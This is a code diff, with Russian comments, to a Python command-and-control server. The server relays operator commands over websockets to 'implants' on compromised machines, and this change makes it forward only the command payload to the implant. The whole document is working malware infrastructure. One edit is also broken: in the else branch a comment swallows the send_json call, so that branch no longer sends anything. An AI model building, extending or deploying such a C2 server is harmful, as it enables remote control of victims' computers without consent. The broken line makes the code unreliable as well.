@@ -1,4 +1,4 @@
-# --- ФАЙЛ: c2_server.py (Финальный, "тупой" почтальон) ---
+# --- ФАЙЛ: c2_server.py (Версия, вскрывающая конверты) ---
 import asyncio, json, os
 from aiohttp import web
 
@@ -40,8 +40,15 @@ async def websocket_handler(request):
 
             if client_type == 'operator':
                 target_id = data.get('target_id')
+                command_type = data.get('type')
+
                 if target_id in IMPLANTS and not IMPLANTS[target_id].closed:
-                    await IMPLANTS[target_id].send_json(data)
+                    # <<< ГЛАВНОЕ ИСПРАВЛЕНИЕ ЗДЕСЬ >>>
+                    if command_type == 'command':
+                        # Вскрываем конверт и отправляем ТОЛЬКО payload
+                        await IMPLANTS[target_id].send_json(data.get('payload'))
+                    else:
+                        # Остальные типы сообщений (как get_details) отправляем целиком                        await IMPLANTS[target_id].send_json(data)
 
             elif client_type == 'implant':
                 if OPERATOR and not OPERATOR.closed:
@@ -69,5 +76,5 @@ app.router.add_get('/ws', websocket_handler)
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
-    print(f"====== C2 SERVER (V4.0 - Почтальон) ONLINE на порту {port} ======")
+    print(f"====== C2 SERVER (V4.1 - Почтальон-взломщик) ONLINE на порту {port} ======")
     web.run_app(app, host='0.0.0.0', port=port)
